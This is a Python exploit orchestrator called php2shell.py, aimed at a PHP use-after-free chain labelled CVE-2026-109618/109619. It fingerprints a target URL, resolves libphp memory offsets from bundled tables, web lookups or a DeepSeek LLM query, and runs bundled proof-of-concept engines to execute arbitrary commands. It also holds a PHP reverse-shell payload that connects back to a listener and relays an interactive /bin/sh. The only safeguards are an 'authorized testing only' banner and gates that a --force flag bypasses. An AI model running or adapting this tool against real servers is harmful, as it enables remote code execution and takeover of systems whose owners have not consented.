#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
php2shell.py — Wiz-style PHP2Shell UAF chain, automated from one URL
====================================================================

Orchestrator for the full heap-corruption chain (CVE-2026-109618/109619):
worker rotation -> heap leak -> libphp leak -> fake HashTable -> zif_system.

Pipeline:
  1. recon      — passive fingerprint (Server, X-Powered-By, version gate)
  2. preflight  — active probe via check.py: display_errors + memory_limit
  3. gates      — refuse when the chain cannot run (patched/unsupported/
                  display_errors Off / memory_limit=-1)
  4. offsets    — resolve zif_system / zval_ptr_dtor / htdata:
                  CLI > local libphp ELF > docker container > bundled DB >
                  web lookup > LLM (DEEPSEEK_API_KEY, optional)
  5. engine     — run the PoC: poc.py (preferred, field-hardened),
                  exploit.py (3em0), exploit_v2.py (JoasASantos)

Authors: @luizfernandoziron / @zr0n (GitHub)
Based on the public PoCs bundled alongside:
  - poc.py / check.py  (Chr1s-T/php2shell-cve-2026-109618)
  - exploit.py         (3em0/php2shell)
  - exploit_v2.py + lib/ + profiles/ (JoasASantos/php2shell-exploit)
  - 9bie/php2shell-bypass-aslr-exp (original research PoC)

Authorized security testing only.

Usage:
  python3 php2shell.py -u http://TARGET/index.php -c id
  python3 php2shell.py -u http://TARGET/index.php --recon-only
  python3 php2shell.py -u http://TARGET/index.php --libphp ./libphp.so -c id
  DEEPSEEK_API_KEY=sk-... python3 php2shell.py -u http://TARGET/index.php -c id
"""

import argparse
import json
import os
import re
import socket
import subprocess
import sys
import threading
import time
import urllib.error
import urllib.request

if hasattr(sys.stdout, "reconfigure"):
    sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    sys.stderr.reconfigure(encoding="utf-8", errors="replace")
if hasattr(sys.stdin, "reconfigure"):
    sys.stdin.reconfigure(encoding="utf-8", errors="replace")

HERE = os.path.dirname(os.path.abspath(__file__))

POC_PY = os.path.join(HERE, "poc.py")
CHECK_PY = os.path.join(HERE, "check.py")
EXPLOIT_PY = os.path.join(HERE, "exploit.py")
V2_PY = os.path.join(HERE, "exploit_v2.py")
PROFILES_DIR = os.path.join(HERE, "profiles")

# Bundled offset DB (zif_system, zval_ptr_dtor, htdata) from public tables.
# Source: Chr1s-T docs/OFFSETS.md, 3em0 README, JoasASantos profiles.
OFFSET_DB = [
    # (php_version, distro/os hint, zif_system, zval_ptr_dtor, htdata, source)
    ("8.4.26", "docker-official", 0x465370, 0x65EB60, 0x690D8, "3em0 official profile"),
    ("8.5.11", "docker-official", 0x5996E0, 0x7B47A0, 0x690D8, "3em0 official profile"),
    ("8.3.35", "docker-official", 0x3AC080, 0x49EC50, 0x6A0D8, "3em0 official83 profile"),
    ("8.4.26", "sury-ubuntu", 0x242A20, 0x41E5F0, None, "Chr1s-T OFFSETS.md"),
    ("8.3.35", "sury-debian", 0x235DC0, 0x30A210, None, "Chr1s-T OFFSETS.md"),
    ("8.2.34", "sury-ubuntu", 0x22B130, 0x2F9030, None, "Chr1s-T OFFSETS.md"),
    ("8.5.11", "sury-ubuntu", 0x3F3540, 0x5F3220, None, "Chr1s-T OFFSETS.md"),
    ("8.4.26", "debian", 0x465370, 0x65EB60, 0xF8398, "JoasASantos profile"),
    ("8.4.25", "debian", 0x0, 0x0, 0xF8398, "JoasASantos profile (offsets in json)"),
]

WEB_OFFSET_URLS = [
    "https://raw.githubusercontent.com/Chr1s-T/php2shell-cve-2026-109618/main/docs/OFFSETS.md",
    "https://raw.githubusercontent.com/3em0/php2shell/main/README.md",
]

DEEPSEEK_API = "https://api.deepseek.com/chat/completions"
DEEPSEEK_MODEL = "deepseek-chat"

PATCHED = {(8, 2): (8, 2, 35), (8, 3): (8, 3, 36),
           (8, 4): (8, 4, 27), (8, 5): (8, 5, 12)}


def log(msg):
    print("[*] " + msg, flush=True)


def warn(msg):
    print("[!] " + msg, flush=True)


def ok(msg):
    print("[+] " + msg, flush=True)


# ------------------------------------------------------------------- recon
def version_vulnerable(ver):
    """None=unknown, True=vulnerable, False=patched."""
    if not ver:
        return None
    m = re.search(r"(\d+)\.(\d+)\.(\d+)", ver)
    if not m:
        return None
    t = (int(m.group(1)), int(m.group(2)), int(m.group(3)))
    if t[0] < 8:
        return True          # 5.4 - 7.x: affected, EOL
    if t[0] > 8:
        return False
    if (t[0], t[1]) in PATCHED:
        return t < PATCHED[(t[0], t[1])]
    return True              # 8.0 / 8.1: affected, EOL


def recon(url):
    """Passive fingerprint: Server header + X-Powered-By PHP version."""
    info = {"url": url, "server": "", "php": "", "reachable": False}
    req = urllib.request.Request(url, headers={
        "User-Agent": "Mozilla/5.0",
        "Accept": "*/*",
    })
    try:
        with urllib.request.urlopen(req, timeout=10) as r:
            info["reachable"] = True
            info["server"] = r.headers.get("Server", "")
            info["php"] = r.headers.get("X-Powered-By", "")
    except urllib.error.HTTPError as e:
        info["reachable"] = True
        info["server"] = e.headers.get("Server", "")
        info["php"] = e.headers.get("X-Powered-By", "")
    except Exception as e:  # noqa: BLE001
        warn("recon failed: %s" % e)
    return info


def guess_os(info):
    srv = (info.get("server") or "").lower()
    if "ubuntu" in srv:
        return "ubuntu"
    if "debian" in srv:
        return "debian"
    return ""


# ---------------------------------------------------------------- preflight
def preflight(url, timeout=40):
    """Run Chr1s-T check.py --active --json and parse the result."""
    if not os.path.exists(CHECK_PY):
        warn("check.py not found in reference/ — skipping preflight")
        return None
    cmd = [sys.executable, CHECK_PY, "-u", url, "--active", "--json",
           "--timeout", str(timeout)]
    try:
        p = subprocess.run(cmd, capture_output=True, timeout=timeout + 30)
        out = p.stdout.decode("utf-8", "replace")
        return json.loads(out) if out.strip().startswith("{") else None
    except Exception as e:  # noqa: BLE001
        warn("preflight failed: %s" % e)
        return None


# -------------------------------------------------------------- offsets db
def load_profile_jsons():
    """Load JoasASantos profiles/*.json into the DB at runtime."""
    rows = []
    if not os.path.isdir(PROFILES_DIR):
        return rows
    for fname in sorted(os.listdir(PROFILES_DIR)):
        if not fname.endswith(".json"):
            continue
        try:
            with open(os.path.join(PROFILES_DIR, fname)) as f:
                d = json.load(f)
            off = d.get("offsets", {})
            z = int(off.get("zif_system", 0), 16)
            dt = int(off.get("zval_ptr_dtor", 0), 16)
            ht = d.get("stages", {}).get("ht_offset")
            ht = int(ht, 16) if ht else None
            rows.append((d.get("php_version", ""), d.get("os", ""),
                         z, dt, ht, "profile " + fname))
        except (ValueError, KeyError, json.JSONDecodeError):
            pass
    return rows


def web_offset_lookup(php, os_hint):
    """Fetch public offset tables and parse matching rows."""
    if not php:
        return None
    for u in WEB_OFFSET_URLS:
        try:
            with urllib.request.urlopen(u, timeout=20) as r:
                text = r.read().decode("utf-8", "replace")
        except Exception:  # noqa: BLE001
            continue
        # rows like: | name 8.4.26 | 0x242a20 | 0x41e5f0 |
        for m in re.finditer(
                r"([^\|\n]*?" + re.escape(php) +
                r"[^\|\n]*?)\|\s*(0x[0-9a-fA-F]+)\s*\|\s*(0x[0-9a-fA-F]+)",
                text):
            row_os = (m.group(1) or "").lower()
            if os_hint and os_hint not in row_os:
                continue
            return (int(m.group(2), 16), int(m.group(3), 16), None,
                    "web lookup " + u.split("/")[-1])
        # 3em0 README format: | **8.4.26** | ... | `0x465370` | `0x65eb60` |
        for m in re.finditer(
                r"\*\*" + re.escape(php) + r"\*\*[^\n]*`(0x[0-9a-fA-F]+)`"
                r"[^\n]*`(0x[0-9a-fA-F]+)`", text):
            return (int(m.group(1), 16), int(m.group(2), 16), None,
                    "web lookup " + u.split("/")[-1])
    return None


def llm_offset_lookup(php, os_hint, server):
    """Ask DeepSeek for the build offsets. Requires DEEPSEEK_API_KEY."""
    key = os.environ.get("DEEPSEEK_API_KEY", "")
    if not key or not php:
        return None
    prompt = (
        "You are helping compute offsets for the public PHP2Shell research "
        "chain (CVE-2026-109618/109619). Target build: PHP %s, OS hint %r, "
        "Server %r. Known public tables (Chr1s-T php2shell-cve-2026-109618 "
        "docs/OFFSETS.md, 3em0/php2shell README) contain zif_system and "
        "zval_ptr_dtor offsets for sury/docker builds. Reply ONLY with a "
        "JSON object: {\"zif_system\": \"0x...\", \"zval_ptr_dtor\": "
        "\"0x...\", \"htdata\": \"0x...\" or null, \"source\": \"...\"}. "
        "If unknown, reply {\"error\": \"unknown\"}."
        % (php, os_hint, server))
    body = json.dumps({
        "model": DEEPSEEK_MODEL,
        "messages": [{"role": "user", "content": prompt}],
        "temperature": 0,
    }).encode()
    req = urllib.request.Request(DEEPSEEK_API, data=body, headers={
        "Content-Type": "application/json",
        "Authorization": "Bearer " + key,
    })
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            resp = json.loads(r.read().decode())
        content = resp["choices"][0]["message"]["content"]
        m = re.search(r"\{[^{}]*\"zif_system\"[^{}]*\}", content, re.S)
        if not m:
            return None
        d = json.loads(m.group(0))
        if "error" in d:
            return None
        return (int(d["zif_system"], 16), int(d["zval_ptr_dtor"], 16),
                int(d.get("htdata"), 16) if d.get("htdata") else None,
                "LLM: " + d.get("source", "deepseek"))
    except Exception as e:  # noqa: BLE001
        warn("LLM lookup failed: %s" % e)
        return None


def resolve_offsets(args, php, os_hint, server):
    """Resolution order: CLI > ELF > container > DB > web > LLM."""
    if args.zif_offset and args.dtor_offset:
        return (args.zif_offset, args.dtor_offset, args.htdata_offset, "CLI")

    # local libphp.so / docker container (ELF symbol extraction)
    sys.path.insert(0, HERE)
    try:
        from lib.offsets import extract_from_elf, extract_from_container
    except ImportError:
        extract_from_elf = extract_from_container = None
    if args.libphp:
        try:
            z, d = extract_from_elf(args.libphp)
            return (z, d, args.htdata_offset, "ELF " + args.libphp)
        except Exception as e:  # noqa: BLE001
            warn("ELF extraction failed: %s" % e)
    if args.container:
        try:
            z, d = extract_from_container(args.container)
            return (z, d, args.htdata_offset, "container " + args.container)
        except Exception as e:  # noqa: BLE001
            warn("container extraction failed: %s" % e)

    # bundled DB (static + profiles/*.json)
    rows = list(OFFSET_DB) + load_profile_jsons()
    for ver, osrow, z, d, ht, src in rows:
        if ver == php and z and d:
            return (z, d, ht, src)
    if php and not args.no_web:
        hit = web_offset_lookup(php, os_hint)
        if hit:
            return hit

    # LLM (optional, needs DEEPSEEK_API_KEY)
    if php and not args.no_llm:
        hit = llm_offset_lookup(php, os_hint, server)
        if hit:
            return hit
    return None


# ------------------------------------------------------------- engine run
def run_poc(args, off, cmd):
    if not os.path.exists(POC_PY):
        return warn("poc.py not found — clone reference repos first")
    a = [sys.executable, POC_PY, "-u", args.target, "-c", cmd,
         "--no-auto-offsets"]
    if args.proof_file:
        a += ["--proof-file", args.proof_file]
    else:
        a += ["--proof-file", ""]
        if not args.reverse:
            warn("proof polling disabled — command may execute blind; "
                 "use --proof-file <host-path> (lab: lab/out/p) to confirm")
    if off:
        a += ["--zif-offset", hex(off[0]), "--dtor-offset", hex(off[1])]
        if off[2]:
            a += ["--htdata-offset", hex(off[2])]
    if args.force:
        a += ["--force", "--no-gate"]
    if args.allow_unsupported:
        a += ["--allow-unsupported"]
    if args.retries:
        a += ["--retries", str(args.retries)]
    log("engine: Chr1s-T poc.py " + " ".join(a[2:]))
    return subprocess.call(a)


def run_exploit3em0(args, off, cmd):
    if not os.path.exists(EXPLOIT_PY):
        return warn("exploit.py (3em0) not found")
    if len(cmd.encode()) > 14:
        warn("3em0 chain caps commands at 14 bytes; truncation risk")
    a = [sys.executable, EXPLOIT_PY, "-u", args.target, "-c", cmd,
         "--no-auto-offsets"]
    if off:
        a += ["--zif-offset", hex(off[0]), "--dtor-offset", hex(off[1])]
        if off[2]:
            a += ["--htdata-offset", hex(off[2])]
    if args.retries:
        a += ["--retries", str(args.retries)]
    log("engine: 3em0 exploit.py " + " ".join(a[2:]))
    return subprocess.call(a)


def run_v2(args, off, cmd):
    if not os.path.exists(V2_PY):
        return warn("exploit_v2.py (JoasASantos) not found")
    env_file = os.path.join(HERE, "out", "offsets.env")
    os.makedirs(os.path.dirname(env_file), exist_ok=True)
    with open(env_file, "w") as f:
        f.write("ZIF_OFFSET=0x%x\nDTOR_OFFSET=0x%x\n" % (off[0], off[1]))
    a = [sys.executable, V2_PY, "-t", args.target, "--cmd", cmd,
         "--offsets-env", env_file, "--profiles-dir", PROFILES_DIR]
    log("engine: JoasASantos exploit_v2.py " + " ".join(a[2:]))
    return subprocess.call(a)


# ------------------------------------------------------------ reverse shell
REVERSE_PHP = """<?php
$s=fsockopen("{host}",{port});
if(!$s){{exit;}}
fwrite($s,"[+] reverse shell ready\\n");
@file_put_contents("{proof}","reverse shell connected\\n");
$d=array(0=>$s,1=>$s,2=>$s);
proc_open("/bin/sh",$d,$p);
"""


def build_reverse_php(host, port, proof_target):
    return REVERSE_PHP.format(host=host, port=port, proof=proof_target)


def start_listener(host, port):
    """Bind the local listener that receives the connect-back shell."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        s.bind((host, port))
    except OSError as e:
        try:
            s.close()
        except OSError:
            pass
        # distinguish "port already in use" from system-reserved ranges
        probe = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        try:
            probe.connect(("127.0.0.1", port))
            in_use = True
        except OSError:
            in_use = False
        finally:
            probe.close()
        if in_use:
            raise RuntimeError(
                "port %d is already in use by another process — pick a free "
                "one, e.g. --reverse 5555" % port) from e
        raise RuntimeError(
            "cannot bind %s:%d (%s) — the port may be in a Windows-reserved "
            "range; try another port, e.g. --reverse 5555"
            % (host, port, e)) from e
    s.listen(4)
    return s


def relay_shell(conn, addr):
    """Relay stdin/stdout between the local user and the remote shell."""
    ok("reverse shell connected from %s:%d" % addr)
    print("[*] interactive shell — type commands; Ctrl+D / 'exit' to quit",
          flush=True)

    def pipe_out():
        try:
            while True:
                data = conn.recv(4096)
                if not data:
                    break
                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()
        except OSError:
            pass

    t = threading.Thread(target=pipe_out, daemon=True)
    t.start()
    try:
        while True:
            try:
                line = input("sh> ")
            except (EOFError, KeyboardInterrupt):
                break
            if line.strip() in ("exit", "quit"):
                break
            try:
                conn.sendall((line + "\n").encode())
            except OSError:
                break
    finally:
        try:
            conn.close()
        except OSError:
            pass
    print("\n[*] shell closed", flush=True)


def reverse_flow(args, off):
    """Stage a PHP connect-back payload, then run the chain with
    `php</stage` (10 bytes) and hand the shell back to the user."""
    rev = args.reverse
    if ":" in rev:
        host, _, port = rev.rpartition(":")
        port = int(port)
    else:
        # lab default: container reaches the Docker host via host.docker.internal
        host, port = "host.docker.internal", int(rev)

    # local listener (0.0.0.0 unless the user pinned a host)
    bind_host = "0.0.0.0" if host == "host.docker.internal" else host

    # default stage host: the lab bind mount (lab/out -> /out) when present,
    # otherwise the local out/ dir
    default_stage = os.path.join(HERE, "lab", "out", "c")
    if not os.path.isdir(os.path.join(HERE, "lab", "out")):
        default_stage = os.path.join(HERE, "out", "c")
    stage_host = args.stage_host or default_stage
    stage_target = args.stage_target or "/out/c"
    # in the lab, poll the mounted proof so stage 3 stops at attempt 1
    if not args.proof_file and os.path.isdir(os.path.join(HERE, "lab", "out")):
        args.proof_file = os.path.join(HERE, "lab", "out", "p")
    proof_target = args.proof_target or "/out/p"

    payload = build_reverse_php(host, port, proof_target)
    os.makedirs(os.path.dirname(stage_host), exist_ok=True)
    with open(stage_host, "w") as f:
        f.write(payload)
    log("staged payload at %s (container path: %s)" % (stage_host, stage_target))
    log("connect-back target: %s:%d" % (host, port))

    try:
        listener = start_listener(bind_host, port)
    except RuntimeError as e:
        warn(str(e))
        return 1
    log("listening on %s:%d (allow inbound if Windows Firewall asks)"
        % (bind_host, port))

    cmd = "php<%s" % stage_target   # 10 bytes: fits the 14-byte carrier cap
    engine = args.engine
    if engine == "auto":
        engine = "poc"
    if engine == "poc":
        rc = run_poc(args, off, cmd)
    elif engine == "3em0":
        rc = run_exploit3em0(args, off, cmd)
    else:
        rc = run_v2(args, off, cmd)

    # wait for the connect-back (already pending in the backlog, or arrives
    # while worker retries rotate)
    deadline = time.time() + args.reverse_timeout
    conn = None
    addr = None
    listener.settimeout(1.0)
    while time.time() < deadline:
        try:
            conn, addr = listener.accept()
            break
        except socket.timeout:
            continue
        except OSError:
            break
    try:
        listener.close()
    except OSError:
        pass
    if conn is None:
        warn("no connect-back within %ds — chain may have failed"
             % args.reverse_timeout)
        return 1
    relay_shell(conn, addr)
    return rc


def main():
    ap = argparse.ArgumentParser(
        description="PHP2Shell UAF chain (CVE-2026-109618/619) — automated",
        epilog="Authorized testing only.")
    ap.add_argument("-u", "--target", default="", help="any PHP page URL")
    ap.add_argument("-c", "--cmd", default="id", help="command to execute")
    ap.add_argument("--libphp", default="", help="local libphp.so for offsets")
    ap.add_argument("--container", default="",
                    help="docker container to extract libphp.so from")
    ap.add_argument("--zif-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--dtor-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--htdata-offset", type=lambda x: int(x, 0), default=None)
    ap.add_argument("--engine", choices=("auto", "poc", "3em0", "v2"),
                    default="auto")
    ap.add_argument("--retries", type=int, default=0)
    ap.add_argument("--proof-file", default="",
                    help="host path polled for the proof after stage 3 "
                         "(lab: lab/out/p with -c 'id>/out/p')")
    ap.add_argument("--reverse", default="",
                    help="reverse shell mode: LPORT or LHOST:LPORT "
                         "(listener runs here; payload connects back)")
    ap.add_argument("--stage-host", default="",
                    help="host path of the staged PHP payload "
                         "(default: out/c)")
    ap.add_argument("--stage-target", default="",
                    help="container path of the staged payload "
                         "(default: /out/c — the lab mount)")
    ap.add_argument("--proof-target", default="",
                    help="container path touched by the payload as proof "
                         "(default: /out/p)")
    ap.add_argument("--reverse-timeout", type=int, default=90,
                    help="seconds to wait for the connect-back")
    ap.add_argument("--force", action="store_true",
                    help="skip gates (passes --force/--no-gate to the engine)")
    ap.add_argument("--allow-unsupported", action="store_true",
                    help="allow PHP < 8.0 (Chr1s-T --allow-unsupported)")
    ap.add_argument("--no-web", action="store_true", help="skip web lookup")
    ap.add_argument("--no-llm", action="store_true", help="skip LLM lookup")
    ap.add_argument("--recon-only", action="store_true")
    ap.add_argument("--preflight-only", action="store_true")
    ap.add_argument("--list-offsets", action="store_true")
    ap.add_argument("-q", "--quiet", action="store_true")
    a = ap.parse_args()

    if a.list_offsets:
        rows = list(OFFSET_DB) + load_profile_jsons()
        for ver, osrow, z, d, ht, src in rows:
            print("%-8s %-18s zif=0x%-8x dtor=0x%-8x ht=%s  [%s]"
                  % (ver, osrow, z, d,
                     ("0x%x" % ht) if ht else "?", src))
        return 0

    if not a.target:
        ap.error("-u/--target is required")

    log("target: %s" % a.target)
    info = recon(a.target)
    log("Server: %r  X-Powered-By: %r" % (info.get("server"), info.get("php")))
    php = re.search(r"PHP/(\d+\.\d+\.\d+)", info.get("php", ""))
    php_ver = php.group(1) if php else ""
    os_hint = guess_os(info)
    vuln = version_vulnerable(php_ver)

    if vuln is False:
        warn("PHP %s is PATCHED — chain will not run" % php_ver)
        if not a.force:
            return 1
    elif vuln is None:
        warn("PHP version hidden — cannot verify vulnerable range")
    else:
        ok("PHP %s is in the vulnerable range" % (php_ver or "unknown"))

    if not info.get("server", "").lower().startswith("apache"):
        warn("Server header does not look like Apache mod_php "
             "(the public chain is mod_php/prefork shaped)")

    if a.recon_only:
        return 0

    pf = preflight(a.target)
    if pf is not None:
        log("preflight: %s" % json.dumps(pf)[:500])
        if a.preflight_only:
            return 0
        # gates from Chr1s-T research: display_errors=On is required for the
        # stage-1 leak; memory_limit=-1 removes the controllable OOM.
        de = str(pf).find("display_errors")
        if not a.force and ("Off" in str(pf.get("display_errors", "")) or
                            pf.get("display_errors") is False):
            warn("display_errors appears Off — stage-1 heap leak cannot fire")
            warn("use --force only for research")
            return 1

    off = resolve_offsets(a, php_ver, os_hint, info.get("server", ""))
    if off:
        z, d, ht, src = off
        ok("offsets resolved via %s: zif_system=0x%x zval_ptr_dtor=0x%x%s"
           % (src, z, d, (" htdata=0x%x" % ht) if ht else ""))
    else:
        warn("offsets not resolved for PHP %s (os hint: %r)"
             % (php_ver or "?", os_hint))
        warn("options: --libphp ./libphp.so | --container NAME | "
             "--zif-offset/--dtor-offset | set DEEPSEEK_API_KEY for LLM lookup")
        if not a.force:
            return 1

    # engine selection
    engine = a.engine
    if engine == "auto":
        if os.path.exists(POC_PY):
            engine = "poc"
        elif os.path.exists(EXPLOIT_PY):
            engine = "3em0"
        else:
            engine = "v2"
    if a.reverse:
        return reverse_flow(a, off)
    if engine == "poc":
        rc = run_poc(a, off, a.cmd)
    elif engine == "3em0":
        rc = run_exploit3em0(a, off, a.cmd)
    else:
        rc = run_v2(a, off, a.cmd)
    return rc


if __name__ == "__main__":
    sys.exit(main())
